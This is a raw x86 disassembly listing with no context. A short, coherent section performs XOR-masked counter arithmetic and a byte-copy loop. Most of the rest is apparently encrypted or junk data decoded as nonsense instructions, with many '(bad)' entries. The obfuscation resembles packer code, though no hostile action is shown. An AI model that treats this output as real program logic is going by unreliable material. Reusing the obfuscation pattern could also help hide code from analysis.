  40f4b4:	push   0x433a4b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43385b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433897
  40f4d2:	adc    DWORD PTR ds:0x4338a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0xc18afc7]
  40f540:	dec    eax
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	ret    0x8330
  40f54c:	mov    ds:0x8682c1fd,eax
  40f551:	retf   0xd337
  40f554:	add    bh,0x65
  40f557:	mov    edi,0xb6555e1a
  40f55c:	xchg   ecx,eax
  40f55d:	add    al,0x41
  40f55f:	dec    ebx
  40f560:	rcr    DWORD PTR [eax-0x1db4aff3],0x7b
  40f567:	(bad)  
  40f569:	xchg   edx,eax
  40f56a:	loopne 0x40f55f
  40f56c:	jmp    0xc71f5e82
  40f571:	jle    0x40f56e
  40f573:	sbb    ecx,eax
  40f575:	(bad)  
  40f576:	popa   
  40f577:	jmp    0x87288371
  40f57c:	pop    esp
  40f57d:	sub    ecx,edx
  40f57f:	stos   DWORD PTR es:[edi],eax
  40f580:	mov    ebp,ebp
  40f582:	lds    esp,FWORD PTR ds:0xcc67f0b1
  40f588:	and    al,0xb8
  40f58a:	mov    eax,gs:0xb22c3298
  40f590:	adc    eax,esi
  40f592:	push   edx
  40f593:	mov    ?,ebx
  40f595:	inc    ecx
  40f596:	dec    edx
  40f597:	xchg   esi,eax
  40f598:	mov    edi,0x3f192a2a
  40f59d:	call   0x4603:0xc6f87281
  40f5a4:	mov    bh,BYTE PTR [edx+0x4d]
  40f5a7:	sub    ebx,DWORD PTR [edi]
  40f5a9:	cmp    esi,edi
  40f5ab:	mov    ebx,ebp
  40f5ad:	daa    
  40f5ae:	outs   dx,DWORD PTR ds:[esi]
  40f5af:	push   ds
  40f5b0:	or     BYTE PTR [ebx-0x5e5120c8],bl
  40f5b6:	sub    eax,0xb4f86c95
  40f5bb:	rcl    BYTE PTR [ecx],1
  40f5bd:	ja     0x40f596
  40f5bf:	push   edi
  40f5c0:	clc    
  40f5c1:	or     DWORD PTR [ebx-0x3193e088],0x3c095a10
  40f5cb:	jo     0x40f57e
  40f5cd:	cmp    eax,0x9cd06035
  40f5d2:	les    ecx,FWORD PTR [ecx]
  40f5d4:	mov    eax,0x997a23c
  40f5d9:	pop    ds
  40f5da:	kmovb  ebp,k0
  40f5de:	fs int 0xb2
  40f5e1:	or     al,0x89
  40f5e3:	jmp    0x276d:0x652cd63
  40f5ea:	nop
  40f5eb:	fisubr DWORD PTR [eax+0xbd01729]
  40f5f1:	test   BYTE PTR [edx+esi*4],ch
  40f5f4:	cmp    BYTE PTR [esi+0x75],cl
  40f5f7:	(bad)  
  40f5f8:	mov    dl,0x4d
  40f5fa:	in     eax,0x82
  40f5fc:	(bad)  
  40f5fd:	outs   dx,DWORD PTR ds:[esi]
  40f5fe:	xor    ah,dl
  40f600:	sub    al,0xb7
  40f602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f603:	gs pop ds
  40f605:	inc    ebp
  40f606:	lds    ebp,FWORD PTR [eax-0x3e0ef91c]
  40f60c:	ret    0xcf44
  40f60f:	cmc    
  40f610:	dec    eax
  40f611:	mov    eax,ds:0x7f6b23cb
  40f616:	repz xchg ebx,eax
  40f618:	sbb    BYTE PTR [edx-0x2edf5005],cl
  40f61e:	dec    esi
  40f61f:	sub    ebx,DWORD PTR [edi+0x4065266e]
  40f625:	pop    ds
  40f626:	inc    ebx
  40f627:	and    dh,BYTE PTR [eax]
  40f629:	or     DWORD PTR [esi-0x47],esi
  40f62c:	aaa    
  40f62d:	push   0x24
  40f62f:	lods   al,BYTE PTR ds:[esi]
  40f630:	les    esi,FWORD PTR [ebp+eax*8-0x2905b784]
  40f637:	mov    DWORD PTR [ebp+0x1e],esi
  40f63a:	mov    ebp,0x381670c4
  40f63f:	pop    edx
  40f640:	mov    esi,0xc1c3d8d4
  40f645:	(bad)  
  40f646:	iret   
  40f647:	lods   eax,DWORD PTR ds:[esi]
  40f648:	and    ebx,ecx
  40f64a:	popa   
  40f64b:	mov    edx,0x6b5c516a
  40f650:	mov    bh,0xa1
  40f652:	dec    esp
  40f653:	ret    
  40f654:	shr    DWORD PTR [esi],cl
  40f656:	push   eax
  40f657:	les    ebx,FWORD PTR [ebx]
  40f659:	sub    BYTE PTR [ebx-0x25],dh
  40f65c:	adc    ah,BYTE PTR [ebx+0x19b23598]
  40f662:	aaa    
  40f663:	sar    DWORD PTR [esi+0x15],0xfb
  40f667:	xchg   BYTE PTR [edx],dl
  40f669:	out    0x1b,al
  40f66b:	rol    al,0xdb
  40f66e:	adc    al,0xd8
  40f670:	mov    ds:0xe477dbc7,eax
  40f675:	jno    0x40f674
  40f677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f678:	cmp    BYTE PTR [ecx+ebp*8+0x60292684],dl
  40f67f:	sub    eax,DWORD PTR gs:[esi]
  40f682:	cmp    al,0x37
  40f684:	cmp    cl,BYTE PTR [edi]
  40f686:	mov    cl,BYTE PTR [ebx-0x38dce2b4]
  40f68c:	push   0xffffff92
  40f68e:	mov    dl,BYTE PTR [esi-0x67]
  40f691:	ret    0x4dc6
  40f694:	out    0x51,eax
  40f696:	sub    al,0xc
  40f698:	aas    
  40f699:	xchg   ecx,eax
  40f69a:	out    0xf0,eax
  40f69c:	inc    ebx
  40f69d:	mov    al,0xbc
  40f69f:	push   ecx
  40f6a0:	daa    
  40f6a1:	ja     0x40f6a3
  40f6a3:	xchg   ecx,eax
  40f6a4:	std    
  40f6a5:	outs   dx,BYTE PTR ds:[esi]
  40f6a6:	add    esp,edx
  40f6a8:	dec    ebx
  40f6a9:	push   cs
  40f6aa:	push   ebp
  40f6ab:	rcr    BYTE PTR [ebx+ebp*4-0x68550f50],1
  40f6b2:	inc    esp
  40f6b3:	pop    es
  40f6b4:	add    ah,BYTE PTR [ebp+ebx*4-0x38]
  40f6b8:	push   ecx
  40f6b9:	cwde   
  40f6ba:	jno    0x40f6f6
  40f6bc:	or     DWORD PTR [esi],ebp
  40f6be:	test   al,0xa6
  40f6c0:	out    dx,al
  40f6c1:	test   ecx,ebx
  40f6c3:	fstp   TBYTE PTR [ebx-0x7333663e]
  40f6c9:	scas   al,BYTE PTR es:[edi]
  40f6ca:	jbe    0x40f6a4
  40f6cc:	sbb    bh,0x7b
  40f6cf:	jmp    0x15f2:0xed5c68df
  40f6d6:	jnp    0x40f6d3
  40f6d8:	stos   BYTE PTR es:[edi],al
  40f6d9:	pop    ebp
  40f6da:	sub    BYTE PTR [esi],al
  40f6dc:	dec    edx
  40f6dd:	shl    DWORD PTR [eax],1
  40f6df:	mov    ch,0xa4
  40f6e1:	fmul   DWORD PTR [ecx-0x387dd6c7]
  40f6e7:	or     DWORD PTR [edi+0x12bc40c9],esi
  40f6ed:	int3   
  40f6ee:	mov    BYTE PTR [ebx-0x1a],0x4c
  40f6f2:	call   0x9298:0x47a62565
  40f6f9:	push   ss
  40f6fa:	xor    eax,0xca1b3911
  40f6ff:	in     al,dx
  40f700:	jae    0x40f6af
  40f702:	popf   
  40f703:	inc    edx
  40f704:	or     DWORD PTR [esi+0x6f],0x3fd58f9a
  40f70b:	inc    eax
  40f70c:	jl     0x40f71c
  40f70e:	int    0x55
  40f710:	cdq    
  40f711:	sub    ah,BYTE PTR [edi]
  40f713:	xchg   bl,dh
  40f715:	cmp    BYTE PTR [esi-0x5a86c341],cl
  40f71b:	clc    
  40f71c:	rcr    BYTE PTR [esi+ecx*4-0x30],0xfa
  40f721:	mov    dh,0xc4
  40f723:	js     0x40f718
  40f725:	pop    ecx
  40f726:	ret    
  40f727:	mov    eax,ds:0x91b51ef5
  40f72c:	and    ch,BYTE PTR [edi+0x5f07f4e1]
  40f732:	push   ecx
  40f733:	mov    bh,BYTE PTR [ebx+eax*2+0x5bdd9dbc]
  40f73a:	jge    0x40f763
  40f73c:	sbb    DWORD PTR [esi-0x3db17031],ebp
  40f742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f743:	fs dec edx
  40f745:	cs sahf 
  40f747:	and    al,0x29
  40f749:	push   ecx
  40f74a:	mov    WORD PTR [eax+0x76],gs
  40f74d:	nop
  40f74e:	daa    
  40f74f:	jle    0x40f75c
  40f751:	ficom  WORD PTR [ebx+0x7241efd7]
  40f757:	xchg   ebx,eax
  40f758:	mov    eax,0xac9abbe3
  40f75d:	inc    edx
  40f75e:	ror    BYTE PTR [edx-0x3401c81d],0xf8
  40f765:	ins    BYTE PTR es:[edi],dx
  40f766:	push   ss
  40f767:	adc    esi,edi
  40f769:	frstor [edx+0x2e44f6ee]
  40f76f:	sar    DWORD PTR ds:0x7229698d,cl
  40f775:	push   eax
  40f776:	mov    dh,0x36
  40f778:	xor    cl,BYTE PTR [edi-0x7ead91a]
  40f77e:	pop    edi
  40f77f:	lock sahf 
  40f781:	scas   al,BYTE PTR es:[edi]
  40f782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f783:	lea    edi,[edx-0x1a910973]
  40f789:	jbe    0x40f766
  40f78b:	inc    ebx
  40f78c:	mov    ch,0x7c
  40f78e:	jo     0x40f7af
  40f790:	mov    esp,0x3dce0ae5
  40f795:	lahf   
  40f796:	jmp    0x888c19d8
  40f79b:	jae    0x40f722
  40f79d:	cmp    BYTE PTR [eax],dl
  40f79f:	jp     0x40f7cb
  40f7a1:	xor    al,0x7
  40f7a3:	int    0xe6
  40f7a5:	adc    bh,BYTE PTR [ebp-0x5]
  40f7a8:	add    al,0x30
  40f7aa:	sub    bh,0xca
  40f7ad:	mov    esi,esi
  40f7af:	jnp    0x40f7fc
  40f7b1:	mov    edi,0x8da7076c
  40f7b6:	add    ebx,eax
  40f7b8:	or     eax,0xaf836cc7
  40f7bd:	mov    ebx,fs
  40f7bf:	fisubr WORD PTR [ecx]
  40f7c1:	ins    DWORD PTR es:[edi],dx
  40f7c2:	les    ebp,FWORD PTR [edx]
  40f7c4:	sar    dh,1
  40f7c6:	arpl   WORD PTR [ecx+0x1fcaa8bb],si
  40f7cc:	call   0xd902:0x254fab78
  40f7d3:	ins    DWORD PTR es:[edi],dx
  40f7d4:	call   0x221:0x5337a1b3
  40f7db:	inc    ebp
  40f7dc:	outs   dx,BYTE PTR ds:[esi]
  40f7dd:	iret   
  40f7de:	out    dx,al
  40f7df:	clc    
  40f7e0:	mov    esi,0x976e46ce
  40f7e5:	pop    edi
  40f7e6:	clc    
  40f7e7:	mov    bl,0x9
  40f7e9:	sar    BYTE PTR [ecx],0x8d
  40f7ec:	ins    BYTE PTR es:[edi],dx
  40f7ed:	sbb    ebp,DWORD PTR [ebx]
  40f7ef:	jne    0x40f7c1
  40f7f1:	stos   DWORD PTR es:[edi],eax
  40f7f2:	stc    
  40f7f3:	and    eax,0x8ae7b33a
  40f7f8:	lock es or al,0x60
  40f7fc:	out    dx,eax
  40f7fd:	enter  0xb3e9,0xd8
  40f801:	mov    al,BYTE PTR [ebx]
  40f803:	stos   BYTE PTR es:[edi],al
  40f804:	repnz inc edx
  40f806:	cmc    
  40f807:	mov    esi,0x20ad2466
  40f80c:	pop    edx
  40f80d:	enter  0x8384,0xe7
  40f811:	test   eax,0x33004b83
  40f816:	cmp    bh,BYTE PTR [ebx+0x1b2b6333]
  40f81c:	retf   0x2146
  40f81f:	xor    eax,0x37879e5c
  40f824:	cmp    al,0xbe
  40f826:	or     BYTE PTR [ecx-0x31],0xd9
  40f82a:	inc    edi
  40f82b:	in     eax,0xb1
  40f82d:	mov    ds:0x9943fb78,al
  40f832:	xchg   edx,eax
  40f833:	xchg   ebx,eax
  40f834:	loope  0x40f825
  40f836:	inc    edi
  40f837:	xchg   DWORD PTR [esi+0x4b9b2dbb],ebx
  40f83d:	js     0x40f85e
  40f83f:	jle    0x40f7c3
  40f841:	adc    BYTE PTR [edx+0x66],al
  40f844:	daa    
  40f845:	and    DWORD PTR [edi+0x4c],esi
  40f848:	cmp    al,0x61
  40f84a:	repnz xor edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x752e153f
  40f897:	inc    ebx
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	xor    cl,BYTE PTR [ebx+edi*8]
  40f8a3:	jmp    DWORD PTR [ebp+0x7e5cd69d]
  40f8a9:	retf   0x3574
  40f8ac:	les    ecx,FWORD PTR [ecx]
  40f8ae:	or     edx,DWORD PTR [edx+0x2f]
  40f8b1:	sub    BYTE PTR [ebx-0x76],bh
  40f8b4:	clc    
  40f8b5:	and    bh,0xd4
  40f8b8:	cmp    bh,BYTE PTR [eax-0x2b]
  40f8bb:	push   ebx
  40f8bc:	jno    0x40f896
  40f8be:	mov    DWORD PTR [edx],eax
  40f8c0:	dec    esp
  40f8c1:	xchg   edx,eax
  40f8c2:	dec    eax
  40f8c3:	push   ebx
  40f8c4:	into   
  40f8c5:	dec    esi
  40f8c6:	mov    ebx,0x778d3c4
  40f8cb:	jg     0x40f879
  40f8cd:	jmp    0x40f916
  40f8cf:	fbld   TBYTE PTR [ebx+eiz*8-0x32]
  40f8d3:	mov    dl,0x9d
  40f8d5:	push   ds
  40f8d6:	xchg   edi,eax
  40f8d7:	xchg   ah,dl
  40f8d9:	call   0x8046:0x81cb2190
  40f8e0:	mov    al,ds:0x2b561109
  40f8e5:	or     ebp,ebp
  40f8e7:	dec    eax
  40f8e8:	stos   DWORD PTR es:[edi],eax
  40f8e9:	pushf  
  40f8ea:	pop    ebp
  40f8eb:	dec    ebp
  40f8ec:	jns    0x40f93b
  40f8ee:	sbb    bl,BYTE PTR [ebx+0x52]
  40f8f1:	dec    ecx
  40f8f2:	sub    edx,DWORD PTR [esi]
  40f8f4:	pop    es
  40f8f5:	retf   0x5b5a
  40f8f8:	shr    BYTE PTR [esi+0x4f],cl
  40f8fb:	mov    edx,0x88482b09
  40f900:	cmp    DWORD PTR [esi+0xbcb750],0x4af8c9fa
  40f90a:	xlat   BYTE PTR ds:[ebx]
  40f90b:	rcr    DWORD PTR [ebx-0x62],0x62
  40f90f:	push   0xfffffff1
  40f911:	fdivr  st,st(0)
  40f913:	push   es
  40f914:	push   ds
  40f915:	sahf   
  40f916:	ss mov eax,0xf4c0b30
  40f91c:	inc    ecx
  40f91d:	mov    bh,0x3f
  40f91f:	jg     0x40f92c
  40f921:	in     eax,0x32
  40f923:	sbb    edi,DWORD PTR [ecx+0x39f56e06]
  40f929:	stc    
  40f92a:	push   ss
  40f92b:	jnp    0x40f916
  40f92d:	gs loope 0x40f944
  40f930:	pop    ds
  40f931:	mov    eax,DWORD PTR [edi]
  40f933:	sti    
  40f934:	fmul   st,st(7)
  40f936:	sbb    eax,0x8b8c8683
  40f93b:	mov    ds:0x389217ad,eax
  40f940:	mov    edi,esp
  40f942:	cmc    
  40f943:	mov    eax,0x1a7c4664
  40f948:	rcl    DWORD PTR [ebx],1
  40f94a:	and    BYTE PTR [ebx],ah
  40f94c:	push   edx
  40f94d:	stos   DWORD PTR es:[edi],eax
  40f94e:	neg    bh
  40f950:	push   cs
  40f951:	(bad)  
  40f953:	aam    0x54
  40f955:	push   ecx
  40f956:	lea    edx,[ebx]
  40f958:	mov    ebp,0x99d49730
  40f95d:	inc    ecx
  40f95e:	mov    esi,0x5930ea59
  40f963:	add    DWORD PTR [edi-0x4d0ec55c],ebp
  40f969:	cdq    
  40f96a:	or     edi,ebx
  40f96c:	add    DWORD PTR [edx-0x5e],edi
  40f96f:	mov    ecx,0xa9e2618f
  40f974:	inc    ecx
  40f975:	mov    ?,WORD PTR [edx-0x7b3a9d37]
  40f97b:	loope  0x40f90f
  40f97d:	fsubp  st(6),st
  40f97f:	and    eax,0x368ba778
  40f985:	(bad)  
  40f986:	mov    dl,0xb8
  40f988:	out    dx,eax
  40f989:	test   eax,0x55362089
  40f98e:	add    eax,0x6189f11a
  40f993:	pusha  
  40f994:	jp     0x40f98e
  40f996:	sub    al,0xe3
  40f998:	cmp    BYTE PTR [edi],al
  40f99a:	push   edx
  40f99b:	cmp    dl,BYTE PTR [edi]
  40f99d:	js     0x40f93a
  40f99f:	push   ecx
  40f9a0:	adc    eax,0x5c01b281
  40f9a5:	shl    esp,cl
  40f9a7:	adc    eax,0x5b55380a
  40f9ac:	dec    ecx
  40f9ad:	or     eax,0x49dcd78d
  40f9b2:	pop    ds
  40f9b3:	jecxz  0x40f97e
  40f9b5:	pop    esi
  40f9b6:	inc    edx
  40f9b7:	push   ebp
  40f9b8:	sbb    bl,BYTE PTR [edi]
  40f9ba:	cmp    DWORD PTR [edi],ecx
  40f9bc:	cmp    BYTE PTR [edi+0x36],cl
  40f9bf:	(bad)  
  40f9c0:	mov    edx,0x482dbd1c
  40f9c5:	or     esi,DWORD PTR [edx-0x3a]
  40f9c8:	test   DWORD PTR [esi+0x4811d70d],edx
  40f9ce:	sub    ecx,DWORD PTR [esi-0x7ea451d1]
  40f9d4:	jne    0x40f9d2
  40f9d6:	fimul  WORD PTR [edx-0x75]
  40f9d9:	leave  
  40f9da:	or     dl,BYTE PTR [eax]
  40f9dc:	loope  0x40f9ac
  40f9de:	dec    ebx
  40f9df:	out    dx,al
  40f9e0:	xchg   DWORD PTR [ebp-0x5b],edx
  40f9e3:	fwait
  40f9e4:	jecxz  0x40fa24
  40f9e6:	add    al,0x43
  40f9e8:	pop    eax
  40f9e9:	mov    al,0x53
  40f9eb:	dec    esi
  40f9ec:	adc    al,0xd7
  40f9ee:	inc    esi
  40f9ef:	mov    bl,0x80
  40f9f1:	xchg   edx,eax
  40f9f2:	add    edx,DWORD PTR [ebx]
  40f9f4:	add    esi,DWORD PTR [eax]
  40f9f6:	cmp    DWORD PTR [ecx-0x471ec808],edi
  40f9fc:	push   0x1e41eac2
  40fa01:	icebp  
  40fa02:	cwde   
  40fa03:	ror    DWORD PTR [ecx+0x70b108d0],1
  40fa09:	mov    DWORD PTR [edi],ebx
  40fa0b:	mov    ebp,0xfb134607
  40fa10:	mov    ?,WORD PTR [ebx-0x244774c6]
  40fa16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa17:	retf   
  40fa18:	mov    ch,0xf5
  40fa1a:	jmp    0xb519622
  40fa1f:	and    al,0x6e
  40fa21:	js     0x40fa4e
  40fa23:	jge    0x40f9db
  40fa25:	and    DWORD PTR [eax+0x3fb69b9b],0x32
  40fa2c:	jne    0x40fa20
  40fa2e:	or     edx,DWORD PTR [eax+0x19]
  40fa31:	(bad)  
  40fa32:	dec    ecx
  40fa33:	cmp    ebx,DWORD PTR [edx+0x2a63c4a3]
  40fa39:	bnd call 0x929ab8ab
  40fa3f:	call   FWORD PTR [ebx+0x64ce5c0]
  40fa45:	push   ebp
  40fa46:	(bad)  
  40fa47:	(bad)  
  40fa48:	xor    DWORD PTR [esi+0x4dc3a4d8],0x3f0090e6
  40fa52:	push   eax
  40fa53:	xchg   esp,eax
  40fa54:	sub    eax,0x488bf814
  40fa59:	repz xor al,0x63
  40fa5c:	sbb    ah,BYTE PTR [ebp+0x22]
  40fa5f:	xchg   esi,eax
  40fa60:	je     0x40f9fc
  40fa62:	mov    al,ds:0xa1a93ce2
  40fa67:	popf   
  40fa68:	std    
  40fa69:	mov    DWORD PTR [ebp-0x66530854],ecx
  40fa6f:	mov    DWORD PTR [edi+esi*4],edx
  40fa72:	dec    esi
  40fa73:	cmc    
  40fa74:	mov    ebp,0xe4fbba42
  40fa79:	pop    ecx
  40fa7a:	adc    al,0xee
  40fa7c:	cmp    ecx,ebx
  40fa7e:	mov    bl,0x4e
  40fa80:	mov    ecx,esi
  40fa82:	and    BYTE PTR [edx-0x43],bl
  40fa85:	pop    edx
  40fa86:	out    dx,al
  40fa87:	fidivr WORD PTR [edi+0x51]
  40fa8a:	mov    edi,0x872c3e7a
  40fa8f:	in     al,0xd8
  40fa91:	js     0x40fa31
  40fa93:	cmc    
  40fa94:	and    dh,BYTE PTR [ebx-0x2cb7074e]
  40fa9a:	mov    ?,WORD PTR [ebp-0x27ad4c62]
  40faa0:	or     BYTE PTR [esi+edx*8+0x76],dh
  40faa4:	dec    ebx
  40faa5:	jne    0x40fb11
  40faa7:	mov    edi,0xe44296b0
  40faac:	(bad)  
  40faae:	pop    edi
  40faaf:	and    eax,0x6cb29b2e
  40fab4:	add    DWORD PTR [edi+0x63c10618],eax
  40faba:	push   edi
  40fabb:	fisubr WORD PTR [ebp-0x79]
  40fabe:	scas   eax,DWORD PTR es:[edi]
  40fabf:	mov    edx,DWORD PTR [edx]
  40fac1:	mov    esi,0x15bd2182
  40fac6:	push   cs
  40fac7:	or     dh,bl
  40fac9:	dec    ebp
  40faca:	sub    BYTE PTR [esi+0x22],ah
  40facd:	iret   
  40face:	dec    eax
  40facf:	or     DWORD PTR [ebp-0x5ecf16e5],ecx
  40fad5:	cld    
  40fad6:	scas   eax,DWORD PTR es:[edi]
  40fad7:	lods   eax,DWORD PTR ds:[si]
  40fad9:	es jbe 0x40fb05
  40fadc:	icebp  
  40fadd:	in     al,0x6e
  40fadf:	pop    ebx
  40fae0:	pusha  
  40fae1:	jnp    0x40fa73
  40fae3:	sub    eax,0x7581fb34
  40fae8:	pop    ebp
  40fae9:	mov    al,ds:0x7a14eab
  40faee:	xor    cl,ah
  40faf0:	(bad)  
  40faf1:	fwait
  40faf2:	mov    dl,0xae
  40faf4:	call   0xe678fa19
  40faf9:	sub    cl,cl
  40fafb:	and    eax,0xf18ad74f
  40fb00:	adc    eax,0xbe623210
  40fb05:	int    0x2e
  40fb07:	lods   eax,DWORD PTR ds:[esi]
  40fb08:	cmp    eax,0x5cb419d2
  40fb0d:	pop    ss
  40fb0e:	add    ebx,ecx
  40fb10:	test   DWORD PTR [edi],ebx
  40fb12:	(bad)  
  40fb13:	xor    dl,al
  40fb15:	push   cs
  40fb16:	outs   dx,DWORD PTR ds:[esi]
  40fb17:	pop    ds
  40fb18:	mov    dh,0x7e
  40fb1a:	add    dh,al
  40fb1c:	adc    al,bl
  40fb1e:	inc    edx
  40fb1f:	xor    BYTE PTR [ebx],al
  40fb21:	stos   DWORD PTR es:[edi],eax
  40fb22:	jecxz  0x40fb97
  40fb24:	add    eax,0x138b6c05
  40fb29:	ja     0x40fb24
  40fb2b:	in     al,dx
  40fb2c:	sub    BYTE PTR [edi],al
  40fb2e:	setb   cl
  40fb31:	aam    0x19
  40fb33:	cmp    bh,cl
  40fb35:	fnstsw WORD PTR [ebp+0x31e2b007]
  40fb3b:	push   ebp
  40fb3c:	test   eax,0xfd713df9
  40fb41:	dec    edx
  40fb42:	ds mov al,0x54
  40fb45:	les    esp,FWORD PTR [edi]
  40fb47:	not    BYTE PTR [esi+edi*4+0xe7aac70]
  40fb4e:	lds    ebx,FWORD PTR [esi-0x35]
  40fb51:	and    ecx,ebx
  40fb53:	loopne 0x40fbb9
  40fb55:	xor    BYTE PTR ds:0xf8cd68cf,dl
  40fb5b:	jnp    0x40fb93
  40fb5d:	cli    
  40fb5e:	sbb    dh,BYTE PTR [eax]
  40fb60:	sbb    DWORD PTR [ebx+0x6eaed1b6],edi
  40fb66:	dec    edx
  40fb67:	fisttp WORD PTR fs:[ecx-0x713c102e]
  40fb6e:	dec    ecx
  40fb6f:	push   ebx
  40fb70:	pop    edx
  40fb71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb72:	outs   dx,DWORD PTR ds:[esi]
  40fb73:	mov    ds:0x30b58520,al
  40fb78:	xchg   ecx,eax
  40fb79:	sar    dh,1
  40fb7b:	add    al,0x21
  40fb7d:	or     esp,0xffffffa4
  40fb80:	les    edx,FWORD PTR [edi]
  40fb82:	lods   eax,DWORD PTR ds:[esi]
  40fb83:	add    eax,DWORD PTR ds:0x43436041
  40fb89:	js     0x40fb21
  40fb8b:	mov    esp,0x470ebf38
  40fb90:	adc    ebp,DWORD PTR [edi+esi*1+0x67]
  40fb94:	mov    bh,0x96
  40fb96:	or     DWORD PTR [edi],ecx
  40fb98:	push   cs
  40fb99:	imul   edi,esi,0x7
  40fb9c:	scas   eax,DWORD PTR es:[edi]
  40fb9d:	adc    ch,bh
  40fb9f:	xchg   edi,eax
  40fba0:	sub    eax,0x79860fae
  40fba5:	stc    
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x28
  40fbc9:	xchg   BYTE PTR [eax+0x7eb6d010],al
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fbe3
  40fbd5:	sub    al,0x4a
  40fbd7:	lock (bad) 
  40fbd9:	push   0xffffffd5
  40fbdb:	test   BYTE PTR [ebp+0x3e005e7c],0xc7
  40fbe2:	and    bl,BYTE PTR [edx+0x52]
  40fbe5:	mov    edx,0x5ccc6304
  40fbea:	nop
  40fbeb:	mov    ebx,0x54b176c7
  40fbf0:	cmp    ecx,ecx
  40fbf2:	ins    DWORD PTR es:[edi],dx
  40fbf3:	bound  ebp,QWORD PTR [ecx-0x22]
  40fbf6:	push   eax
  40fbf7:	mov    bh,0xa5
  40fbf9:	dec    eax
  40fbfa:	test   al,0x86
  40fbfc:	xor    ebp,DWORD PTR [edx+0x16]
  40fbff:	shr    BYTE PTR [ebp+0x66e8d8e0],1
  40fc05:	fistp  QWORD PTR [esi+eiz*4+0x2c]
  40fc09:	inc    edi
  40fc0a:	fadd   QWORD PTR [eax]
  40fc0c:	out    dx,al
  40fc0d:	or     al,0x52
  40fc0f:	aaa    
  40fc10:	jle    0x40fbee
  40fc12:	js     0x40fc7e
  40fc14:	and    ebp,DWORD PTR [edi+0xd]
  40fc17:	xor    eax,0x807261e0
  40fc1c:	rcl    BYTE PTR [eax+eiz*2-0x70],1
  40fc20:	je     0x40fc03
  40fc22:	jo     0x40fbeb
  40fc24:	inc    ebx
  40fc25:	mov    ds:0x2d986f95,al
  40fc2a:	pop    esp
  40fc2b:	lea    ebx,[ebx+0x5132229a]
  40fc31:	lods   eax,DWORD PTR ds:[esi]
  40fc32:	add    al,BYTE PTR ds:[ebx]
  40fc35:	fadd   QWORD PTR [esi+0x434c5c6f]
  40fc3b:	fs pusha 
  40fc3d:	inc    ebp
  40fc3e:	imul   BYTE PTR [ecx+0x53f6c39f]
  40fc44:	xor    al,0x68
  40fc46:	popa   
  40fc47:	imul   eax,DWORD PTR [edx+0x6f],0x6
  40fc4b:	mov    ebx,0x839293d2
  40fc50:	je     0x40fbf1
  40fc52:	std    
  40fc53:	in     eax,0x24
  40fc55:	dec    esi
  40fc56:	xor    edx,0x60
  40fc59:	dec    ecx
  40fc5a:	pop    eax
  40fc5b:	retf   0xd556
  40fc5e:	addr16 adc al,0xa6
  40fc61:	ds call 0x1255:0x7e1823c7
  40fc69:	cmp    al,0xb4
  40fc6b:	nop
  40fc6c:	fldcw  WORD PTR [ecx+esi*8+0x4c2bfc4b]
  40fc73:	enter  0xa283,0xfe
  40fc77:	ss sbb eax,0x17c5bf49
